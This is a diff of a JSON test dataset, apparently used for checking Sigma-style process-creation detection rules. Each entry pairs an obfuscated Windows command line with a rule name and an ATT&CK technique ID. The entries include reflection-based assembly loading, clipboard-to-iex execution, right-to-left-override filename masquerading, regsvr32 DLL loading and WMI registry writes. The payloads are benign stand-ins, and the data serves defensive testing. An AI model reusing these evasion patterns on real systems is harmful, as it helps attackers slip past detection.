     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -14993,7 +14993,7 @@
   },
   {
     "test_id": "t1012_064",
-    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -15001,7 +15001,7 @@
   },
   {
     "test_id": "t1012_065",
-    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -15009,7 +15009,7 @@
   },
   {
     "test_id": "t1012_066",
-    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -15017,7 +15017,7 @@
   },
   {
     "test_id": "t1012_067",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -\"f\" 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -\"f\" 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -15025,7 +15025,7 @@
   },
   {
     "test_id": "t1012_068",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -15033,7 +15033,7 @@
   },
   {
     "test_id": "t1012_069",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -15937,7 +15937,7 @@
   },
   {
     "test_id": "t1036.002_001",
-    "target_commandline": "powershell.exe -Command \"$rtlo = [char]0x202E; & \"C:\\Users\\thaim\\Desktop\\evil_batch${rtlo}fdp.bat\"\"",
+    "target_commandline": "powershell.exe -Command \"$rtlo = [char]0x202E; & \\\"C:\\Users\\thaim\\Desktop\\evil_batch${rtlo}fdp.bat\\\"\"",
     "target_rule": "proc_creation_win_susp_right_to_left_override",
     "technique_id": "t1036.002",
     "shell": "cmd.exe",
@@ -16081,7 +16081,7 @@
   },
   {
     "test_id": "t1047_069",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16089,7 +16089,7 @@
   },
   {
     "test_id": "t1047_070",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16097,7 +16097,7 @@
   },
   {
     "test_id": "t1047_071",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16105,7 +16105,7 @@
   },
   {
     "test_id": "t1047_072",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16113,7 +16113,7 @@
   },
   {
     "test_id": "t1047_073",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16137,7 +16137,7 @@
   },
   {
     "test_id": "t1047_076",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16145,7 +16145,7 @@
   },
   {
     "test_id": "t1047_077",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16153,7 +16153,7 @@
   },
   {
     "test_id": "t1047_078",
-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16161,7 +16161,7 @@
   },
   {
     "test_id": "t1047_079",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16169,7 +16169,7 @@
   },
   {
     "test_id": "t1047_080",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16177,7 +16177,7 @@
   },
   {
     "test_id": "t1047_081",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16793,7 +16793,7 @@
   },
   {
     "test_id": "t1047_158",
-    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /c \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16801,7 +16801,7 @@
   },
   {
     "test_id": "t1047_159",
-    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \" iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /C \"echo Write-Host 'Bypass' | clip & powershell.exe -nop -c \\\" iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -16825,7 +16825,7 @@
   },
   {
     "test_id": "t1047_162",
-    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\"\"",
+    "target_commandline": "cmd /r \"echo Write-Host 'Bypass' | clip && powershell.exe -nop -c \\\" $c='cl'+'ipboard]::'; iex([System.Windows.Forms.Clipboard]::GetText())\\\"\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_clip",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17017,7 +17017,7 @@
   },
   {
     "test_id": "t1047_186",
-    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \"{1}{0}\" -f 'st','Te' & %LAUNCH%\"",
+    "target_commandline": "cmd.exe /c \"set PAYLOAD=Write-Host 'Benign Educational Bypass' & set LAUNCH=powershell.exe -NoP -c \\\"{1}{0}\\\" -f 'st','Te' & %LAUNCH%\"",
     "target_rule": "proc_creation_win_hktl_invoke_obfuscation_via_var",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17049,7 +17049,7 @@
   },
   {
     "test_id": "t1047_190",
-    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17057,7 +17057,7 @@
   },
   {
     "test_id": "t1047_191",
-    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17225,7 +17225,7 @@
   },
   {
     "test_id": "t1047_212",
-    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\"{1}{0}\" -f 'oad','L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -Command \"[Reflection.Assembly]::(\\\"{1}{0}\\\" -f 'oad','L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17233,7 +17233,7 @@
   },
   {
     "test_id": "t1047_213",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17241,7 +17241,7 @@
   },
   {
     "test_id": "t1047_214",
-    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMANd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17249,7 +17249,7 @@
   },
   {
     "test_id": "t1047_215",
-    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17257,7 +17257,7 @@
   },
   {
     "test_id": "t1047_216",
-    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -coMMaNd \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17265,7 +17265,7 @@
   },
   {
     "test_id": "t1047_217",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -\"f\" 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -\"f\" 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17273,7 +17273,7 @@
   },
   {
     "test_id": "t1047_218",
-    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\" {1}{0}\" -F 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -F 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -17281,7 +17281,7 @@
   },
   {
     "test_id": "t1047_219",
-    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\" {1}{0}\" -f 'oad' ,'L').Invoke($data)\"",
+    "target_commandline": "powershell.exe -c \"[Reflection.Assembly]::(\\\" {1}{0}\\\" -f 'oad' ,'L').Invoke($data)\"",
     "target_rule": "proc_creation_win_powershell_base64_reflection_assembly_load_obfusc",
     "technique_id": "t1047",
     "shell": "cmd.exe",
@@ -18201,7 +18201,7 @@
   },
   {
     "test_id": "t1059.005_021",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -18209,7 +18209,7 @@
   },
   {
     "test_id": "t1059.005_022",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -18217,7 +18217,7 @@
   },
   {
     "test_id": "t1059.005_023",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -18225,7 +18225,7 @@
   },
   {
     "test_id": "t1059.005_024",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -18233,7 +18233,7 @@
   },
   {
     "test_id": "t1059.005_025",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.005",
     "shell": "cmd.exe",
@@ -18273,7 +18273,7 @@
   },
   {
     "test_id": "t1059.007_016",
-    "target_commandline": "C:\\Windows\\System32\\wbem\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wbem\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -18281,7 +18281,7 @@
   },
   {
     "test_id": "t1059.007_017",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -18289,7 +18289,7 @@
   },
   {
     "test_id": "t1059.007_018",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -18297,7 +18297,7 @@
   },
   {
     "test_id": "t1059.007_019",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -18305,7 +18305,7 @@
   },
   {
     "test_id": "t1059.007_020",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1059.007",
     "shell": "cmd.exe",
@@ -18553,7 +18553,7 @@
   },
   {
     "test_id": "t1218_034",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1218",
     "shell": "cmd.exe",
@@ -18561,7 +18561,7 @@
   },
   {
     "test_id": "t1218_035",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1218",
     "shell": "cmd.exe",
@@ -18569,7 +18569,7 @@
   },
   {
     "test_id": "t1218_036",
-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1218",
     "shell": "cmd.exe",
@@ -18577,7 +18577,7 @@
   },
   {
     "test_id": "t1218_037",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1218",
     "shell": "cmd.exe",
@@ -18585,7 +18585,7 @@
   },
   {
     "test_id": "t1218_038",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1218",
     "shell": "cmd.exe",
@@ -18593,7 +18593,7 @@
   },
   {
     "test_id": "t1218_039",
-    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1218",
     "shell": "cmd.exe",
@@ -18689,7 +18689,7 @@
   },
   {
     "test_id": "t1134.004_006",
-    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe -\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1134.004",
     "shell": "cmd.exe",
@@ -18697,7 +18697,7 @@
   },
   {
     "test_id": "t1134.004_007",
-    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\"",
+    "target_commandline": "powershell.exe /\"Command\" \"[Convert]::FromBase64String('d2hvYW1p')\\\"",
     "target_rule": "proc_creation_win_powershell_base64_frombase64string",
     "technique_id": "t1134.004",
     "shell": "cmd.exe",
@@ -19609,7 +19609,7 @@
   },
   {
     "test_id": "t1218.010_034",
-    "target_commandline": "cmd.exe /c \"C:\\Windows\\syswow64\\regsvr32.exe /s C:\"\"AtomicRedTeam\\atomics\\T1218.010\\bin\\AllTheThingsx86.dll\"",
+    "target_commandline": "cmd.exe /c \"C:\\Windows\\syswow64\\regsvr32.exe /s C:\\\"\"AtomicRedTeam\\atomics\\T1218.010\\bin\\AllTheThingsx86.dll\"",
     "target_rule": "proc_creation_win_regsvr32_susp_exec_path_2",
     "technique_id": "t1218.010",
     "shell": "cmd.exe",
@@ -19937,7 +19937,7 @@
   },
   {
     "test_id": "t1219.002_002",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /node:localhost process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1219.002",
     "shell": "cmd.exe",
@@ -19945,7 +19945,7 @@
   },
   {
     "test_id": "t1219.002_003",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe -\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1219.002",
     "shell": "cmd.exe",
@@ -19953,7 +19953,7 @@
   },
   {
     "test_id": "t1219.002_004",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /\"node:localhost\" process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1219.002",
     "shell": "cmd.exe",
@@ -19961,7 +19961,7 @@
   },
   {
     "test_id": "t1219.002_005",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /noDe:LOCALhosT process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1219.002",
     "shell": "cmd.exe",
@@ -19969,7 +19969,7 @@
   },
   {
     "test_id": "t1219.002_006",
-    "target_commandline": "C:\\Windows\\System32\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
+    "target_commandline": "C:\\\\Windows\\\\System32\\\\wmic.exe /nOdE:lOcalHoST process where name='svchost.exe' get CommandLine",
     "target_rule": "proc_creation_win_wmic_squiblytwo_bypass",
     "technique_id": "t1219.002",
     "shell": "cmd.exe",
@@ -20617,7 +20617,7 @@
   },
   {
     "test_id": "t1012_139",
-    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -Nop -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -20625,7 +20625,7 @@
   },
   {
     "test_id": "t1012_140",
-    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell /\"nop\" -\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -20633,7 +20633,7 @@
   },
   {
     "test_id": "t1012_141",
-    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" -c \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -20641,7 +20641,7 @@
   },
   {
     "test_id": "t1012_142",
-    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -NoProfile /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
     "shell": "cmd.exe",
@@ -20649,7 +20649,7 @@
   },
   {
     "test_id": "t1012_143",
-    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\default:StdRegProv').CreateKey(2147483650,'Software\\Policies\\DeleteMe')\"",
+    "target_commandline": "powershell -\"nop\" /\"c\" \"([wmiclass]'ROOT\\\\default:StdRegProv').CreateKey(2147483650,'Software\\\\Policies\\\\DeleteMe')\"",
     "target_rule": "proc_creation_win_wmic_stdregprov_reg_modification",
     "technique_id": "t1012",
